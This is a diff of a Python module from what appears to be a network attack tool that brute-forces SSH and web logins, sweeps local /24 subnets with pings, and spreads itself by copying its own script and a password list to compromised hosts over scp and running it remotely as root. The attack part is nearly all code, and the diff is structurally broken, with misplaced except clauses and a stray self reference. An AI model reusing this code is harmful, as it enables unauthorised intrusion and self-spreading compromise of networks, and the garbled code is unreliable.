@@ -51,6 +51,22 @@ class NetPropagation:
         self.ip_list = ip_list
         self.password_list = password_list
 
+    def additional_actions(self, transfer_file, propagation_script, arguments):
+        """
+        This function passes the appropriate arguments to and runs the
+        transferring file and propagating functions, these functions contain
+        the check to stop them from being run if the appropriate arguments
+        aren't used
+        :param transfer_file: The file that will be transferred upon user
+        request
+        :param propagation_script: The script that will be propagated upon user
+        request
+        :param arguments: Arguments passed in by the user themselves
+        """
+        transfer_file.check_transfer_file(arguments, self.ip, self.port,
+                                          self.username)
+        self.propagating(propagation_script, arguments)
+
     def check_over_ssh(self, filename):
         """
         This function checks if a given file is already located at the target
@@ -76,50 +92,6 @@ class NetPropagation:
                 client.close()
                 return True
 
-def check_over_ssh(ip, port, username, password):
-    """
-    This function checks if the net_propagation.py script is already located at
-    the target machine over SSH. If it is then false is returned and if not
-    then true is returned. This is needed as a prerequisite to propagating over
-    SSH
-    :param ip: The IP address target for SSH
-    :param port: The port on which we're running SSH
-    :param username: The username to target over SSH
-    :param password: Password to use with SSH
-    :return True: If the file doesn't exist on the target host or there's a
-    problem with SSH (assuming file isn't present essentially)
-    :return False: If the file does exist
-    """
-    client = SSHClient()
-    try:
-        client.set_missing_host_key_policy(RejectPolicy)
-        client.connect(hostname=str(ip), port=int(port),
-                       username=str(username), password=str(password))
-        if strings.touch_file(strings.DEMO_SCRIPT_FILENAME) == "touch demo.py":
-            client.exec_command(pipes.quote(strings.
-                                            touch_file(strings.
-                                                       DEMO_SCRIPT_FILENAME)))
-        else:
-            logging.error(strings.SANITATION_FAILED)
-            client.close()
-            return False
-        if strings.cat_file(strings.DEMO_SCRIPT_FILENAME) == "cat demo.py":
-            if str(client.exec_command(pipes.quote(strings.cat_file(
-                    strings.DEMO_SCRIPT_FILENAME)))[1]).__len__() < 1:
-                client.close()
-                return True
-
-        except NoValidConnectionsError:
-            client.close()
-            return True
-
-        except TimeoutError:
-            client.close()
-            return True
-
-        except SSHException:
-            client.close()
-            return True
 
     def connect_ssh_client(self):
         """
@@ -261,201 +233,6 @@ def check_over_ssh(ip, port, username, password):
                         logging.error(strings.SANITATION_FAILED)
                         client.close()
                         return False
-
-def connect_web(ip, port, username, password):
-    """
-    This function check to see if a web login can be established and if so then
-    it returns true, if not then it returns false
-    :param ip: The target IP address for web login
-    :param port: The target port for web login
-    :param username: The target username for web login
-    :param password: The target password for web login
-    :return True: If the web login is successful
-    :return False: If the web login connect is unsuccessful
-    """
-    attempt_succeeded = False
-    try:
-        send_post_request_with_login(ip, port, username, password)
-        attempt_succeeded = True
-    except RuntimeError:
-        logging.debug(strings.connection_status(strings.WEB, ip, port,
-                                                strings.UNSUCCESSFUL))
-    if attempt_succeeded:
-        logging.info(strings.connection_status(strings.WEB, ip, port,
-                                               strings.SUCCESSFUL))
-    return attempt_succeeded
-
-
-def convert_file_to_list(filename):
-    """
-    This function will convert a given file specified by a filename to a list
-    and will then proceed to return that list
-    :param filename: The filename of the file that needs to be converted to a
-    list
-    :return file_as_list: The list of the lines from the file
-    """
-    try:
-        with open(filename) as file:
-            file_as_list = append_lines_from_file_to_list(file)
-        return file_as_list
-    except FileNotFoundError:
-        logging.error(strings.FILE_DOES_NOT_EXIST)
-        return None
-
-
-def cycle_through_subnet(ip_list, interface):
-    """
-    This function takes in a given network interface and an IP list, it will
-    get the IP address of the interface and add all the address from its /24
-    subnet to the IP list and will then return the list
-    :param ip_list: The list of IP addresses in the subnet
-    :param interface: The interface on which each IP address is to be checked
-    for a response
-    """
-    interface_split = get_if_addr(interface).split(strings.FULL_STOP)
-    last_byte = 0
-    while last_byte < 256:
-        specific_address = str(interface_split[0]) + strings.FULL_STOP \
-                           + str(interface_split[1]) + strings.FULL_STOP \
-                           + str(interface_split[2]) + strings.FULL_STOP \
-                           + str(last_byte)
-        if not ip_list.__contains__(specific_address):
-            logging.info(strings.adding_address_to_interface(specific_address,
-                                                             interface))
-            if ip_list is not strings.SPACE:
-                ip_list.append(specific_address)
-            else:
-                ip_list = [specific_address]
-        last_byte = last_byte + 1
-    return ip_list
-
-
-def file_error_handler():
-    """
-    This function handles errors related to the processing of files.
-    """
-    print(strings.FILENAME_PROCESSING_ERROR)
-    exit_and_show_instructions()
-
-
-def file_not_exist(ip, port, username, password):
-    """
-    This function will check whether network_attack.py exists on a target
-    machine and how it does that is dependent on the port being passed in
-    :param ip: IP of the machine we're checking for a file for
-    :param port: Port on which we which to check the machine
-    :param username: Username to use as part of checking the file
-    :param password: Password being used as part of checking the file
-    :return check_over_ssh(ip, port, username, password):
-    """
-    return check_over_ssh(ip, port, username, password)
-
-
-def gathering_local_ips(ip_list):
-    """
-    This function will cycle through all local interfaces outside the loopback
-    interface and will add their /24 subnets to the IP list
-    :param ip_list: The IPs for which we're fetching the subnets
-    :return ip_list: The IP list with the newly found subnet addresses
-    """
-    logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
-    local_interfaces = get_if_list()
-    # if strings.LOOPBACK in local_interfaces:
-    #     local_interfaces = local_interfaces.remove(strings.LOOPBACK)
-    for interface in local_interfaces:
-        if str(interface) != strings.LOOPBACK:
-            logging.info(strings.fetching_ips_for_interface(interface))
-            ip_list = (cycle_through_subnet(ip_list, interface))
-    return ip_list
-
-
-def exit_and_show_instructions():
-    """
-    This function will print the help screen and show an exit prompt.
-    """
-    print(strings.help_output())
-    print(strings.EXITING)
-
-
-def is_reachable_ip(ip):
-    """
-    This function checks to see if an IP is reachable and returns true if it is
-    and false if it isn't. The commented out code is the scapy way of doing it
-    and the uncommented code uses OS calls. In my testing OS calls were faster
-    but both approaches work
-    :param ip: The IP address we're checking to see if it is reachable
-    :return True: If the IP address is reachable
-    :return False: If the IP address is not reachable
-    """
-    # ping_pkt = IP(dst=str(ip))/ICMP()
-    # reply = sr(ping_pkt, timeout=1)[0]
-    # if not reply:
-    #     logging.debug(strings.ip_reachability(ip, False))
-    #     return False
-    # logging.info(strings.ip_reachability(ip, True))
-    # return True
-    command = [strings.PING, strings.PING_ARGUMENT, strings.ONE, str(ip)]
-    if subprocess.call(command) == 0:
-        logging.info(strings.ip_reachability(ip, True))
-        return True
-    logging.debug(strings.ip_reachability(ip, False))
-    return False
-
-
-def propagate_script(ip, port, login_string):
-    """
-    This function is responsible for propagating the network_attack.py to a
-    previously bruteforce machine. It will only run when the user specifies
-    using the appropriate argument and when the port being bruteforce is 22
-    (SSH), it will also check to ensure the script isn't  already present on
-    the target. It goes about propagating the script in different ways
-    depending on if an SSH port is specified
-    :param ip: The IP address we wish to propagate the script to
-    :param port: The port through which we'll propagate the script
-    :param login_string: This string contains the username and password for the
-    service used
-    :return True: If the script is successfully propagated here
-    :return False: If the script is not successfully propagated here
-    """
-    login_string_split = login_string.split(strings.COLON)
-    try:
-        if file_not_exist(ip, port, login_string_split[0],
-                          login_string_split[1]):
-            print(strings.RSA_AND_PROMPT)
-            os.system(strings.scp_command_string(port,
-                                                 login_string_split[0],
-                                                 ip,
-                                                 os.path
-                                                 .basename(__file__)))
-            print(strings.RSA_PROMPT_AGAIN)
-            os.system(strings.scp_command_string(port,
-                                                 login_string_split[0],
-                                                 ip,
-                                                 strings.PWDS_LIST))
-            client = SSHClient()
-            try:
-                client.set_missing_host_key_policy(RejectPolicy)
-                client.connect(hostname=str(ip), port=int(port),
-                               username=str(login_string_split[0]),
-                               password=str(login_string_split[1]))
-                if strings.run_script_command() == "./demo.py -L -p 22 -u " \
-                                                   "root -f " \
-                                                   "src/test_files/" \
-                                                   "passwords_list.txt -P":
-                    client.exec_command(pipes.quote(
-                        strings.run_script_command()))
-                else:
-                    logging.error(strings.SANITATION_FAILED)
-                    client.close()
-                    return True
-                except RuntimeError:
-                    client.close()
-                    return False
-            else:
-                logging.debug(strings_functions.file_present_on_host(self.ip))
-                return False
-        except RuntimeError:
-            return False
 
     def propagating(self, script, arguments):
         """
@@ -618,19 +395,3 @@ def propagate_script(ip, port, login_string):
             return str(sign_in_details), service
         logging.debug(strings.IMPOSSIBLE_ACTION)
         return None, service
-
-    def additional_actions(self, transfer_file, propagation_script, arguments):
-        """
-        This function passes the appropriate arguments to and runs the
-        transferring file and propagating functions, these functions contain
-        the check to stop them from being run if the appropriate arguments
-        aren't used
-        :param transfer_file: The file that will be transferred upon user
-        request
-        :param propagation_script: The script that will be propagated upon user
-        request
-        :param arguments: Arguments passed in by the user themselves
-        """
-        transfer_file.check_transfer_file(arguments, self.ip, self.port,
-                                          self.username)
-        self.propagating(propagation_script, arguments)
